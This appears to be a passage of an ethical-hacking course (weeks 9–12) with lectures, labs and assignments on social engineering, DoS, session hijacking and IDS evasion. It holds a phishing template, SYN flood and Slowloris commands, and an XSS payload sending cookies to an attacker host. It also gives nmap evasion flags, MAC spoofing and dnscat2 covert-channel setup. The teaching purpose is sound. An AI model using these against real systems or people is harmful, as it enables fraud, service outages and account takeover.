## WEEK 9: Social Engineering

### 📖 Lecture Notes

#### Topics Covered
- Social Engineering Concepts
- Human Psychology and Manipulation Techniques
- Impersonation and Identity Fraud
- Phishing Attacks
- Spear Phishing and Whaling
- Vishing (Voice Phishing)
- Smishing (SMS Phishing)
- Physical Social Engineering
- Tailgating and Piggybacking
- Reverse Social Engineering
- Social Engineering Countermeasures

#### Key Concepts

**What is Social Engineering?**
Social engineering is the art of manipulating people into performing actions or divulging confidential information. It exploits human psychology rather than technical vulnerabilities.

**Why Social Engineering Works:**
- Authority: People obey those in positions of authority
- Intimidation: Fear of consequences for non-compliance
- Consensus/Social Proof: "Everyone else is doing it"
- Scarcity: Limited-time offers create urgency
- Familiarity/Liking: People trust those they like
- Trust: Default assumption of honesty
- Urgency: Time pressure reduces critical thinking

**Social Engineering Attack Vectors:**

| Vector | Description | Example |
|--------|-------------|---------|
| Phishing | Mass email attacks | Fake bank emails |
| Spear Phishing | Targeted email attacks | Email to CFO appearing from CEO |
| Whaling | Targeting executives | Fake legal summons to CEO |
| Vishing | Voice calls | Fake IT support call |
| Smishing | SMS messages | Fake delivery notification |
| Impersonation | Pretending to be someone | Fake technician |
| Tailgating | Following authorized person | "I forgot my badge" |
| Dumpster Diving | Searching trash | Finding documents with passwords |
| Shoulder Surfing | Watching someone type | Observing PIN entry |

**Phishing Email Components:**
1. **Sender Spoofing:** Making email appear from trusted source
2. **Urgent Language:** "Your account will be suspended!"
3. **Call to Action:** "Click this link immediately"
4. **Fake URLs:** Links to attacker-controlled websites
5. **Malicious Attachments:** Infected documents or macros

**Physical Social Engineering:**
- **Tailgating:** Following authorized person through secure door
- **Badge Cloning:** Copying RFID access cards
- **Lock Picking:** Physical entry to restricted areas
- **Eavesdropping:** Listening to sensitive conversations
- **Camera Surveillance:** Observing security measures

#### Social Engineering Tools

| Tool | Purpose |
|------|---------|
| SET (Social-Engineer Toolkit) | Phishing framework |
| Gophish | Phishing campaign management |
| King Phisher | Phishing campaign toolkit |
| Maltego | OSINT and relationship mapping |
| theHarvester | Email discovery |

---

### 🔧 Practical Lab 9: Social Engineering Demonstrations

#### Objectives
- Create phishing email templates
- Set up phishing campaign with Gophish
- Understand psychological manipulation techniques
- Learn social engineering countermeasures
- **IMPORTANT: All activities in isolated lab only**

#### Step-by-Step Instructions

**Step 1: Social-Engineer Toolkit (SET)**
```bash
# Launch SET
sudo setoolkit

# Menu options:
1. Social-Engineering Attacks
2. Fast-Track Penetration Testing
3. Third Party Modules
4. Update the Social-Engineer Toolkit
5. Update SET configuration

# Select: 1 > 2 (Website Attack Vectors) > 3 (Credential Harvester)
# This demonstrates how credential harvesting works
```

**Step 2: Create a Phishing Email Template (Educational)**
```html
<!-- This is an EXAMPLE of what NOT to trust -->
<!-- Use only in controlled training environments -->

Subject: URGENT: Your Account Requires Immediate Verification

Dear [User],

We have detected unusual activity on your account. To prevent suspension,
please verify your identity within 24 hours by clicking the link below:

[Link to legitimate training site - NOT a real phishing site]

Failure to verify your identity will result in account termination.

Regards,
Security Team

<!-- Discussion points: What makes this convincing? What are the red flags? -->
```

**Red Flags in Phishing Emails:**
1. Generic greeting instead of personal name
2. Urgency and threats
3. Suspicious sender address
4. Links don't match claimed destination
5. Poor grammar or spelling
6. Requests for sensitive information
7. Unexpected attachments

**Step 3: Set Up Gophish (Training Environment)**
```bash
# Download Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip

# Extract and configure
unzip gophish-*.zip
cd gophish
chmod +x gophish
./gophish

# Access admin panel
# https://localhost:3333
# Default password is in the console output

# Configure:
1. Sending Profile (use lab SMTP)
2. Email Template (clearly mark as TRAINING)
3. Landing Page (training page only)
4. Users & Groups (lab users only)
5. Campaign (training campaign)
```

**Step 4: Physical Security Assessment Demo**
```
Create a checklist for physical security assessment:
□ Are entrances secured with access controls?
□ Do employees wear visible ID badges?
□ Are visitors escorted at all times?
□ Are computer screens visible from public areas?
□ Are passwords written on sticky notes?
□ Is there a shredder for sensitive documents?
□ Are server rooms locked and monitored?
```

#### Expected Outcomes
- Understanding of social engineering techniques
- Ability to identify phishing attempts
- Knowledge of psychological manipulation tactics
- Awareness of physical security risks
- Skills to train others in social engineering awareness

---

### 📝 Assignment 9

**Part A: Phishing Analysis (40 points)**
1. Collect 3 real phishing emails you've received (or find examples online)
2. For each email, analyze:
   - Sender information (actual vs. displayed)
   - Psychological triggers used
   - Call to action
   - Red flags present
   - What would happen if you clicked
3. Create a "Phishing Identification Guide" for non-technical users

**Part B: Social Engineering Scenario (60 points)**
Design a social engineering scenario (fictional) and document:
1. Target selection and rationale
2. Attack vector chosen and why
3. Pretext/backstory created
4. Information or access sought
5. How the attack would be executed step-by-step
6. Countermeasures that would prevent the attack
7. How to train employees against this specific attack

**Submission Format:** Two documents (phishing analysis + scenario design).

---

---

## WEEK 10: Denial-of-Service (DoS) Attacks

### 📖 Lecture Notes

#### Topics Covered
- DoS vs. DDoS Attacks
- DoS Attack Types
- Volumetric Attacks
- Protocol Attacks
- Application Layer Attacks
- Amplification Attacks
- Botnets
- DoS Mitigation Strategies
- DoS Testing Tools

#### Key Concepts

**DoS vs. DDoS:**
- **DoS (Denial of Service):** Single source attacking target
- **DDoS (Distributed Denial of Service):** Multiple sources (botnet) attacking target

**DoS Attack Categories:**

**1. Volumetric Attacks (Bandwidth Consumption):**
```
Goal: Saturate target's network bandwidth
- UDP Flood: Send massive UDP packets
- ICMP Flood: Ping flood
- Amplification Attacks: NTP, DNS, SSDP reflection
```

**2. Protocol Attacks (Resource Consumption):**
```
Goal: Consume server/computing resources
- SYN Flood: Exhaust connection table
- Ping of Death: Oversized packets
- Smurf Attack: ICMP broadcast amplification
- Teardrop: Fragment overlap
```

**3. Application Layer Attacks:**
```
Goal: Crash or overwhelm specific applications
- HTTP Flood: Massive web requests
- Slowloris: Hold connections open
- Slow POST: Slow request body transmission
- Database exhaustion: Complex queries
```

**SYN Flood Mechanics:**
```
Normal:
Client → SYN → Server
Client ← SYN/ACK ← Server
Client → ACK → Server (Connection established)

SYN Flood:
Attacker → SYN → Server
Attacker ← SYN/ACK ← Server
Attacker ✗ NO RESPONSE (Server waits, resources consumed)
Repeat thousands of times → Server crashes
```

**Botnet Architecture:**
```
Bot Herder (Attacker)
    ↓ Command & Control (C&C)
Botmaster Server
    ↓ Commands
Infected Computers (Bots/Zombies)
    ↓ Coordinated attack
Target Website/Server
```

#### DoS Tools

| Tool | Purpose | Notes |
|------|---------|-------|
| hping3 | Packet crafting/testing | Legitimate security tool |
| LOIC | Volume testing | Also used illegally |
| HOIC | Enhanced LOIC | Also used illegally |
| Slowloris | Connection exhaustion | Educational use only |
| Metasploit | DoS modules | Lab testing only |

**⚠️ LEGAL WARNING:**
Launching DoS attacks against systems you don't own or have explicit written permission to test is a FEDERAL CRIME under the CFAA. All practical exercises MUST be performed in isolated lab environments only.

---

### 🔧 Practical Lab 10: DoS Attack Demonstrations (Lab Only)

#### Objectives
- Understand DoS attack mechanics
- Demonstrate SYN flood attack
- Observe application-layer DoS
- Learn detection and mitigation
- **ONLY perform on your own isolated lab systems**

#### Step-by-Step Instructions

**Step 1: SYN Flood with hping3 (Lab Only)**
```bash
# Target: Your Metasploitable VM ONLY
# Monitor target's performance during attack

# On Metasploitable, monitor connections:
netstat -an | grep SYN_RECV | wc -l

# On Kali, launch SYN flood:
sudo hping3 -S --flood -p 80 <Metasploitable_IP>

# Monitor the impact:
# - Check Metasploitable's response times
# - Watch connection count increase
# - Observe system degradation

# STOP the attack with Ctrl+C
# Document observations
```

**Step 2: Slowloris Attack (Educational)**
```bash
# Install Slowloris
pip3 install slowloris

# Run against your lab web server
slowloris <Metasploitable_IP> -p 80 -s 300

# This opens many connections and holds them open
# Watch the web server become unresponsive

# STOP with Ctrl+C
```

**Step 3: Application Layer HTTP Flood**
```bash
# Simple HTTP flood demonstration (lab only)
# This sends many legitimate-looking requests

# Using Apache Bench (ab)
ab -n 10000 -c 100 http://<target>/

# -n 10000 = total requests
# -c 100 = concurrent connections

# Observe server performance degradation
```

**Step 4: DoS Detection and Mitigation**
```bash
# On the target system, detect DoS:

# Check for SYN flood
netstat -an | grep SYN_RECV | wc -l
# If number is abnormally high, likely under SYN flood

# Identify source IPs
netstat -an | grep SYN_RECV | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n

# Block attacking IP (temporary mitigation)
sudo iptables -A INPUT -s <attacker_IP> -j DROP

# Enable SYN cookies (Linux protection)
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Rate limit connections
sudo iptables -A INPUT -p tcp --syn --dport 80 -m limit --limit 1/s --limit-burst 3 -j ACCEPT
```

#### Expected Outcomes
- Understanding of DoS mechanics
- Ability to detect DoS attacks
- Knowledge of mitigation techniques
- Appreciation for legal boundaries

---

### 📝 Assignment 10

**Part A: DoS Lab Report (50 points)**
1. Perform a controlled SYN flood against Metasploitable using hping3
2. Document:
   - Commands used
   - System behavior before, during, and after attack
   - How you detected the attack from the target
   - Mitigation steps you implemented
3. Include performance metrics and screenshots

**Part B: Research Paper (50 points)**
Research a major DDoS attack from history and write a 3-5 page report:
- GitHub 2018 (1.35 Tbps attack)
- Dyn 2016 (Mirai botnet)
- Spamhaus 2013
- Estonia 2007

Include:
- Attack type and scale
- Attack infrastructure used
- Impact and duration
- Response and mitigation
- Lessons learned

**Submission Format:** Lab report + research paper.

---

---

## WEEK 11: Session Hijacking

### 📖 Lecture Notes

#### Topics Covered
- Session Hijacking Concepts
- Session Tokens and Cookies
- Cookie Stealing Techniques
- Session Fixation
- Cross-Site Scripting (XSS) for Session Theft
- Sidejacking
- HTTP Response Splitting
- Session Hijacking Prevention

#### Key Concepts

**What is Session Hijacking?**
Session hijacking involves taking over a user's active session by stealing or predicting their session token, allowing the attacker to impersonate the user.

**How Sessions Work:**
```
1. User logs into website
2. Server creates session and generates token
3. Token sent to browser as cookie
4. Browser includes cookie in subsequent requests
5. Server validates token and serves content
```

**Session Token Vulnerabilities:**
- Predictable token generation
- Token exposed in URL
- Token transmitted in cleartext (HTTP)
- Token stored insecurely
- Token not invalidated after logout
- Session fixation vulnerabilities

**Session Hijacking Methods:**

| Method | Description | Complexity |
|--------|-------------|------------|
| Session Sniffing | Capture tokens from network traffic | Low |
| Cross-Site Scripting | Inject script to steal cookies | Medium |
| Session Fixation | Force known session ID on user | Medium |
| Predictable Tokens | Guess session IDs | Low-Medium |
| Sidejacking | Intercept cookies on same network | Low |
| Man-in-the-Middle | Intercept and modify traffic | Medium-High |

**Cookie Attributes:**
```
Set-Cookie: session_id=abc123;
  Path=/;              # Scope of cookie
  Domain=.example.com; # Which domain
  Secure;              # HTTPS only
  HttpOnly;            # Not accessible to JavaScript
  SameSite=Strict;     # CSRF protection
  Expires=Thu, 01 Jan 2025 00:00:00 GMT
```

---

### 🔧 Practical Lab 11: Session Hijacking Demonstrations

#### Objectives
- Capture and analyze session cookies
- Perform session hijacking in lab
- Demonstrate cookie stealing via XSS
- Learn session management best practices
- Implement secure session handling

#### Step-by-Step Instructions

**Step 1: Capture Session Cookie with Wireshark**
```bash
# Start Wireshark on Kali
sudo wireshark

# Navigate to HTTP site on Metasploitable (DVWA)
# http://<target>/dvwa/

# Log in with credentials
# Observe the Set-Cookie header in response

# In Wireshark:
# Filter: http.cookie
# Find the session cookie being transmitted
```

**Step 2: Cookie Manipulation with Browser**
```
In Firefox/Chrome:
1. Install "EditThisCookie" or "Cookie-Editor" extension
2. Navigate to target website
3. Open cookie editor
4. View current session cookie
5. Modify cookie values
6. Refresh page and observe behavior
```

**Step 3: Session Hijacking with Firesheep (Conceptual)**
```
Note: Firesheep is deprecated but demonstrates the concept

Modern alternative - Bettercap:
sudo bettercap

# Enable network sniffing
net.sniff on

# Watch for session cookies in traffic
# Any HTTP cookies transmitted in cleartext will be visible
```

**Step 4: Cookie Stealing via XSS (DVWA)**
```bash
# Access DVWA on Metasploitable
# Set security level to "Low"

# Stored XSS payload (creates keylogger effect):
<script>
  new Image().src = 'http://<Kali_IP>/cookie.php?c=' + document.cookie;
</script>

# On Kali, set up listener:
nc -lvnp 80

# When victim visits the page, their cookie is sent to you
# Use cookie in your browser to impersonate them
```

**Step 5: Session Fixation Attack**
```
1. Attacker obtains valid session ID from target site
2. Attacker crafts URL with session ID:
   http://target.com/login?sessionid=KNOWN_ID
3. Victim clicks link and logs in
4. Attacker uses same session ID to access victim's account

# Demonstration:
# Find a site that passes session ID in URL
# Note the session ID before victim logs in
# After victim logs in, use same session ID
# Observe you're now authenticated as victim
```

#### Expected Outcomes
- Understanding of session management
- Ability to identify insecure session handling
- Skills to steal and reuse session tokens
- Knowledge of session protection techniques

---

### 📝 Assignment 11

**Part A: Session Hijacking Lab (60 points)**
1. Capture a session cookie from DVWA using Wireshark
2. Use the captured cookie to impersonate the logged-in user
3. Perform cookie stealing via XSS in DVWA (Low security)
4. Document each step with:
   - Commands used
   - Screenshots of the process
   - Explanation of what happened
   - How the attack could be prevented

**Part B: Secure Session Design (40 points)**
Design a secure session management system. Document:
1. How session tokens are generated (cryptographically secure)
2. How tokens are transmitted (HTTPS only)
3. How tokens are storeded securely (cookie flags)
4. Session timeout implementation
5. Session invalidation on logout
6. Protection against fixation, prediction, and hijacking

Provide code examples or pseudocode for your design.

**Submission Format:** Technical documentation with diagrams and code examples.

---

---

## WEEK 12: Evading IDS, Firewalls, and Honeypots

### 📖 Lecture Notes

#### Topics Covered
- IDS/IPS Types and Operations
- Firewall Architectures
- Honeypots and Honeynets
- Evasion Techniques
- Fragmentation Attacks
- Tunneling and Covert Channels
- Obfuscation Techniques
- Proxy Chains and Anonymization
- Detection Avoidance

#### Key Concepts

**IDS (Intrusion Detection System):**
- **NIDS (Network-based):** Monitors network traffic
- **HIDS (Host-based):** Monitors individual hosts
- **Signature-based:** Matches known attack patterns
- **Anomaly-based:** Detects deviations from baseline

**IPS (Intrusion Prevention System):**
- Like IDS but can actively block threats
- Inline with traffic flow
- Can drop packets, reset connections, block IPs

**Firewall Types:**

| Type | Layer | Description |
|------|-------|-------------|
| Packet Filter | Network | Examines IP headers and ports |
| Stateful Inspection | Transport | Tracks connection states |
| Application Proxy | Application | Understands application protocols |
| Next-Gen Firewall | Multiple | Deep packet inspection, application awareness |
| WAF | Application | Specifically protects web apps |

**Honeypots:**
- Decoy systems designed to attract attackers
- **Low-interaction:** Emulates services (Kippo, Dionaea)
- **High-interaction:** Real systems, closely monitored
- **Honeynet:** Network of honeypots
- Purpose: Study attacker behavior, gather intelligence

**Evasion Techniques:**

**1. Fragmentation:**
```
Split attack payload across multiple IP fragments
IDS may not reassemble correctly
```

**2. Encoding/Obfuscation:**
```
URL encoding: %27 instead of '
Unicode: \u0027 instead of '
Double encoding: %2527
Base64: Encoded payloads
```

**3. Timing Attacks:**
```
Slow down attacks to avoid threshold detection
Send one probe per hour instead of 1000 per second
```

**4. Protocol Manipulation:**
```
Use non-standard ports
Encrypt attack traffic
Use allowed protocols (DNS, HTTP) for tunneling
```

**Anonymization Tools:**

| Tool | Purpose |
|------|---------|
| Tor | Anonymous routing |
| ProxyChains | Chain proxies |
| VPN | Encrypted tunnel |
| MAC Changers | Spoof hardware address |
| Tails OS | Amnesic incognito live system |

---

### 🔧 Practical Lab 12: Evasion Techniques

#### Objectives
- Understand IDS/IPS operation
- Practice evasion techniques (lab only)
- Configure Snort IDS rules
- Test firewall bypass methods
- Use proxy chains for anonymization

#### Step-by-Step Instructions

**Step 1: Configure Snort IDS (Detection)**
```bash
# Install Snort
sudo apt install snort

# Configure Snort for your network
sudo nano /etc/snort/snort.conf
# Set HOME_NET to your lab network: 192.168.56.0/24

# Create custom rule to detect nmap scans
sudo nano /etc/snort/rules/local.rules

# Add rule:
alert tcp any any -> $HOME_NET any (msg:"Possible Nmap SYN Scan"; flags:S; threshold: type both, track by_src, count 100, seconds 10; sid:1000001;)

# Start Snort
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

**Step 2: Test IDS Evasion with Nmap**
```bash
# Normal scan (will be detected)
nmap -sS <target>

# Fragment packets (may evade)
nmap -f -sS <target>

# Uncommon timing (slow scan)
nmap -T1 -sS <target>

# Decoy scanning
nmap -D RND:5 <target>

# Source port manipulation
nmap --source-port 53 <target>
nmap --source-port 80 <target>

# Check Snort alerts to see what was detected
```

**Step 3: ProxyChains Configuration**
```bash
# Install ProxyChains
sudo apt install proxychains

# Configure
sudo nano /etc/proxychains.conf
# Add proxy servers:
# socks4  127.0.0.1 9050
# http    10.0.0.1 8080

# Use with any tool
proxychains nmap <target>
proxychains curl http://target.com
proxychains firefox
```

**Step 4: MAC Address Spoofing**
```bash
# Check current MAC
ifconfig eth0

# Change MAC address
sudo ifconfig eth0 down
sudo macchanger -r eth0  # Random MAC
sudo ifconfig eth0 up

# Verify change
ifconfig eth0
```

**Step 5: DNS Tunneling (Concept)**
```bash
# Install dnscat2
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install

# Start server
ruby ./dnscat2.rb

# This demonstrates how attackers can use DNS for covert C&C
# DNS traffic is rarely blocked or inspected deeply
```

#### Expected Outcomes
- Understanding of IDS/IPS operation
- Knowledge of evasion techniques
- Ability to test security controls
- Awareness of detection capabilities

---

### 📝 Assignment 12: MIDTERM PREPARATION

**Part A: Practice Midterm Exam (100 points)**
Take a full 50-question practice exam covering Weeks 1-12 topics:
- Ethical hacking fundamentals
- Reconnaissance and scanning
- Enumeration and vulnerability assessment
- System hacking and malware
- Sniffing and social engineering
- Session hijacking and DoS
- IDS/firewall evasion

**Part B: Lab Skills Assessment**
Document your proficiency in the following tools:
1. Nmap - Create a comprehensive scan report
2. Metasploit - Exploit one vulnerability on Metasploitable
3. Wireshark - Analyze a captured session
4. John the Ripper - Crack at least 2 passwords
5. Nikto - Scan a web server

**Study Resources for Midterm:**
- Review all lecture notes
- Re-read textbook chapters 1-12
- Complete all practice questions
- Review lab exercises
- Focus on weak areas identified in practice exams

**Submission Format:** Completed practice exam + skills portfolio.

---

---
